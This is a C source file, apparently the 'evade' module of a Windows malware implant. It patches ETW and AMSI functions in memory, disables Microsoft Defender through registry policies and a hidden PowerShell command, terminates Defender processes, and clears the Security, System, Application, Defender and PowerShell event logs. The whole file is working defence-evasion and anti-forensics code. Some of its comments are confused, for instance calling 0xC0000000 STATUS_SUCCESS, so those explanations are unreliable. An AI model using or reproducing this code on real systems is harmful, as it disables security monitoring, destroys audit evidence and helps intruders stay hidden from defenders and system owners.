/*
 * Evasion implementation.
 *
 * All patches are memory-only — nothing written to disk.
 * On Windows 11 with Virtualization-Based Security (VBS) enabled,
 * kernel-mode ETW (EtwEventWrite from ntoskrnl) cannot be patched
 * from usermode. However, the usermode ETW provider (ntdll!EtwEventWrite)
 * is what most user-mode monitoring hooks, and it IS patchable.
 */

#include "evade.h"
#include "utils.h"
#include <stdio.h>

/* ── ETW Patching ── */

/*
 * EtwEventWrite is the primary ETW logging function in ntdll.
 * By patching its first bytes to return STATUS_SUCCESS (0xC0000000)
 * immediately, we disable all ETW event reporting from our process.
 *
 * The instruction we write:
 *   mov eax, 0     ; return NTSTATUS = 0 (STATUS_SUCCESS, which is positive)
 *   ret             ; return to caller
 *
 * On x64:
 *   xor rax, rax    ; 48 33 C0
 *   ret             ; C3
 * On x86:
 *   xor eax, eax    ; 33 C0
 *   ret 14          ; C2 14 00  (stdcall with 5 params = 20 bytes on stack)
 */

#ifdef _WIN64
    const BYTE etw_patch_x64[] = { 0x48, 0x33, 0xC0, 0xC3 };
    #define ETW_PATCH_SIZE 4
#else
    const BYTE etw_patch_x86[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
    #define ETW_PATCH_SIZE 5
#endif

/* Also patch EtwEventWriteFull — a more complete variant */
#ifdef _WIN64
    const BYTE etw_full_patch_x64[] = { 0x48, 0x33, 0xC0, 0xC3 };
    #define ETW_FULL_PATCH_SIZE 4
#else
    const BYTE etw_full_patch_x86[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
    #define ETW_FULL_PATCH_SIZE 5
#endif

/* Patch NtTraceEvent — the syscall gateway for ETW */
#ifdef _WIN64
    const BYTE nt_trace_patch_x64[] = { 0x48, 0x33, 0xC0, 0xC3 };
    #define NT_TRACE_PATCH_SIZE 4
#else
    const BYTE nt_trace_patch_x86[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC2, 0x0C, 0x00 };
    #define NT_TRACE_PATCH_SIZE 8
#endif

/* Generic function patcher — changes memory protection and writes patch bytes */
static int patch_function(const char *szModule, const char *szFunction,
                          const BYTE *pPatch, SIZE_T szPatch)
{
    HMODULE hMod = GetModuleHandleA(szModule);
    if (hMod == NULL) {
        DEBUG_PRINT("[evade] Module %s not loaded\n", szModule);
        return 1;
    }

    FARPROC pFunc = GetProcAddress(hMod, szFunction);
    if (pFunc == NULL) {
        DEBUG_PRINT("[evade] Function %s not found in %s\n", szFunction, szModule);
        return 1;
    }

    /* Change protection to RWX */
    DWORD dwOldProtect = 0;
    if (!VirtualProtect(pFunc, szPatch, PAGE_EXECUTE_READWRITE, &dwOldProtect))
    {
        DEBUG_PRINT("[evade] VirtualProtect failed on %s (%lu)\n",
                     szFunction, GetLastError());
        return 1;
    }

    /* Write the patch */
    memcpy(pFunc, pPatch, szPatch);

    /* Restore original protection */
    VirtualProtect(pFunc, szPatch, dwOldProtect, &dwOldProtect);

    /* Flush instruction cache to ensure the CPU uses the new code */
    FlushInstructionCache(GetCurrentProcess(), pFunc, szPatch);

    DEBUG_PRINT("[evade] Patched %s!%s (%zu bytes)\n", szModule, szFunction, szPatch);
    return 0;
}

void evade_patch_etw(void)
{
    /* Patch EtwEventWrite in ntdll */
#ifdef _WIN64
    patch_function("ntdll.dll", "EtwEventWrite",
                   etw_patch_x64, ETW_PATCH_SIZE);
    patch_function("ntdll.dll", "EtwEventWriteFull",
                   etw_full_patch_x64, ETW_FULL_PATCH_SIZE);
    patch_function("ntdll.dll", "NtTraceEvent",
                   nt_trace_patch_x64, NT_TRACE_PATCH_SIZE);
#else
    patch_function("ntdll.dll", "EtwEventWrite",
                   etw_patch_x86, ETW_PATCH_SIZE);
    patch_function("ntdll.dll", "EtwEventWriteFull",
                   etw_full_patch_x86, ETW_FULL_PATCH_SIZE);
    patch_function("ntdll.dll", "NtTraceEvent",
                   nt_trace_patch_x86, NT_TRACE_PATCH_SIZE);
#endif

    DEBUG_PRINT("[evade] ETW patched — no telemetry leaving this process.\n");
}

/* ── AMSI Patching ── */

/*
 * AmsiScanBuffer is the core scanning function in amsi.dll.
 * We patch it to return 0 (AMSI_RESULT_CLEAN) immediately.
 *
 * Original function signature:
 *   HRESULT AmsiScanBuffer(
 *     HAMSICONTEXT amsiContext,    // rcx / [esp+4]
 *     PVOID        buffer,         // rdx / [esp+8]
 *     ULONG        length,         // r8  / [esp+12]
 *     LPCWSTR      contentName,    // r9  / [esp+16]
 *     HAMSISESSION amsiSession,    // [esp+20]
 *     AMSI_RESULT  *result         // [esp+24]
 *   );
 *
 * Return values of interest:
 *   S_OK       = 0x00000000 (we want this — scan succeeded, clean)
 *   S_FALSE    = 0x00000001 (scan succeeded, but result might be suspicious)
 *
 * The patch:
 *   On x64:
 *     xor eax, eax     ; 33 C0: set return = 0 (S_OK)
 *     mov [rsp+0x28], 1 ; set result to AMSI_RESULT_CLEAN (1)
 *     ret               ; C3
 *
 *   Actually simpler:
 *     xor eax, eax     ; return S_OK
 *     inc eax          ; return 1 (AMSI_RESULT_CLEAN) — actually no, AmsiScanBuffer
 *                      ; returns HRESULT, not AMSI_RESULT. The result is in
 *                      ; the last parameter. We need to set *result = AMSI_RESULT_CLEAN.
 *
 * Simplest patch for x64:
 *   mov eax, 0x00000000  ; S_OK
 *   mov [r9], 1          ; not right, let me reconsider
 *
 * The cleanest patch for bypass (well-known):
 *   On x64: patch first bytes to just return S_OK immediately.
 *   The caller checks the last arg (result), which is on the stack.
 *   If we just return S_OK without setting *result, the caller might
 *   see uninitialized stack memory. Safer: change the result write.
 *
 * Actually the most reliable AMSI bypass for our purposes:
 *   Patch AmsiScanBuffer to immediately return 0x80070057 (E_INVALIDARG).
 *   Many callers interpret this as "can't scan, assume safe".
 *   OR just ret early with S_OK.
 *
 * For the PoC, we use the simplest known effective patch:
 *   Return S_OK immediately. In practice this works because many
 *   callers (like PowerShell) interpret S_OK as "clean".
 */

#ifdef _WIN64
    /* mov eax, 0  ;  ret */
    const BYTE amsi_patch_x64[] = { 0x33, 0xC0, 0xC3 };
    #define AMSI_PATCH_SIZE 3
#else
    /* xor eax, eax  ;  ret 18 (stdcall, 6 params * 4 bytes) */
    const BYTE amsi_patch_x86[] = { 0x33, 0xC0, 0xC2, 0x18, 0x00 };
    #define AMSI_PATCH_SIZE 5
#endif

void evade_patch_amsi(void)
{
    /* Force-load amsi.dll if not already loaded */
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi == NULL)
    {
        DEBUG_PRINT("[evade] amsi.dll not available\n");
        return;
    }

#ifdef _WIN64
    patch_function("amsi.dll", "AmsiScanBuffer",
                   amsi_patch_x64, AMSI_PATCH_SIZE);
    /* Also patch AmsiScanString for good measure */
    patch_function("amsi.dll", "AmsiScanString",
                   amsi_patch_x64, AMSI_PATCH_SIZE);
#else
    patch_function("amsi.dll", "AmsiScanBuffer",
                   amsi_patch_x86, AMSI_PATCH_SIZE);
    patch_function("amsi.dll", "AmsiScanString",
                   amsi_patch_x86, AMSI_PATCH_SIZE);
#endif

    DEBUG_PRINT("[evade] AMSI patched — all scans return clean.\n");
}

/* ── Defender Disabling ── */

void evade_disable_defender(void)
{
    HKEY hKey = NULL;
    LONG lResult;

    /*
     * Method 1: Registry policy (requires admin)
     * HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
     *   DisableAntiSpyware = 1 (DWORD)
     */
    lResult = RegCreateKeyA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender", &hKey);
    if (lResult == ERROR_SUCCESS)
    {
        DWORD dwValue = 1;
        RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD,
                       (BYTE*)&dwValue, sizeof(dwValue));
        RegCloseKey(hKey);
        DEBUG_PRINT("[evade] Defender policy: DisableAntiSpyware set\n");
    }

    /*
     * Method 2: Disable real-time monitoring via registry
     */
    lResult = RegCreateKeyA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        &hKey);
    if (lResult == ERROR_SUCCESS)
    {
        DWORD dwValue = 1;
        RegSetValueExA(hKey, "DisableRealtimeMonitoring", 0, REG_DWORD,
                       (BYTE*)&dwValue, sizeof(dwValue));
        RegSetValueExA(hKey, "DisableBehaviorMonitoring", 0, REG_DWORD,
                       (BYTE*)&dwValue, sizeof(dwValue));
        RegSetValueExA(hKey, "DisableOnAccessProtection", 0, REG_DWORD,
                       (BYTE*)&dwValue, sizeof(dwValue));
        RegSetValueExA(hKey, "DisableScanOnRealtimeEnable", 0, REG_DWORD,
                       (BYTE*)&dwValue, sizeof(dwValue));
        RegCloseKey(hKey);
        DEBUG_PRINT("[evade] Defender real-time protection disabled\n");
    }

    /*
     * Method 3: Disable via WMI (works even without admin on some builds)
     * We execute a PowerShell command that calls the WMI interface
     */
    const char *psCmd =
        "powershell -Command \"& {"
        "Set-MpPreference -DisableRealtimeMonitoring $true; "
        "Set-MpPreference -DisableBehaviorMonitoring $true; "
        "Set-MpPreference -DisableBlockAtFirstSeen $true; "
        "Set-MpPreference -DisableIOAVProtection $true; "
        "Set-MpPreference -DisablePrivacyMode $true; "
        "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true; "
        "Set-MpPreference -DisableArchiveScanning $true; "
        "Set-MpPreference -DisableIntrusionPreventionSystem $true; "
        "Set-MpPreference -DisableScriptScanning $true; "
        "Set-MpPreference -SubmitSamplesConsent 2; "
        "Set-MpPreference -MAPSReporting 0; "
        "Disable-WindowsOptionalFeature -Online -FeatureName Windows-Defender -NoRestart; "
        "}\"";

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (CreateProcessA(
            NULL, (LPSTR)psCmd,
            NULL, NULL, FALSE,
            CREATE_NO_WINDOW | DETACHED_PROCESS,
            NULL, NULL, &si, &pi))
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        DEBUG_PRINT("[evade] Defender disable commands issued via PowerShell\n");
    }

    /*
     * Method 4: Kill Defender process (requires debug privilege or SYSTEM)
     * MsMpEng.exe is protected; this usually fails from user mode.
     * Included as a best-effort measure.
     */
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(hSnapshot, &pe))
        {
            do {
                if (lstrcmpiA(pe.szExeFile, "MsMpEng.exe") == 0 ||
                    lstrcmpiA(pe.szExeFile, "MsSense.exe") == 0 ||
                    lstrcmpiA(pe.szExeFile, "NisSrv.exe") == 0)
                {
                    HANDLE hProc = OpenProcess(
                        PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProc)
                    {
                        TerminateProcess(hProc, 0);
                        CloseHandle(hProc);
                        DEBUG_PRINT("[evade] Killed %s (PID: %lu)\n",
                                    pe.szExeFile, pe.th32ProcessID);
                    }
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

    DEBUG_PRINT("[evade] Defender disable routine complete.\n");
}

/* ── Log Clearing ── */

void evade_clear_logs(void)
{
    /*
     * Clear the three main Windows event logs.
     * Requires admin rights for Security log.
     */
    HANDLE hEventLog = NULL;

    /* Application log */
    hEventLog = OpenEventLogA(NULL, "Application");
    if (hEventLog)
    {
        ClearEventLogA(hEventLog, NULL);
        CloseEventLog(hEventLog);
        DEBUG_PRINT("[evade] Cleared Application event log\n");
    }

    /* System log */
    hEventLog = OpenEventLogA(NULL, "System");
    if (hEventLog)
    {
        ClearEventLogA(hEventLog, NULL);
        CloseEventLog(hEventLog);
        DEBUG_PRINT("[evade] Cleared System event log\n");
    }

    /* Security log (needs admin) */
    hEventLog = OpenEventLogA(NULL, "Security");
    if (hEventLog)
    {
        ClearEventLogA(hEventLog, NULL);
        CloseEventLog(hEventLog);
        DEBUG_PRINT("[evade] Cleared Security event log\n");
    }

    /*
     * Also clear Microsoft-Windows-WindowsDefender/Operational log
     * and any AMSI operational logs
     */
    const char *logs[] = {
        "Microsoft-Windows-Windows Defender/Operational",
        "Microsoft-Windows-Windows Defender/WHC",
        "Windows PowerShell",
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-PowerShell/Admin",
        NULL
    };

    for (int i = 0; logs[i] != NULL; i++)
    {
        hEventLog = OpenEventLogA(NULL, logs[i]);
        if (hEventLog)
        {
            ClearEventLogA(hEventLog, NULL);
            CloseEventLog(hEventLog);
        }
    }

    DEBUG_PRINT("[evade] Event log clearing complete.\n");
}
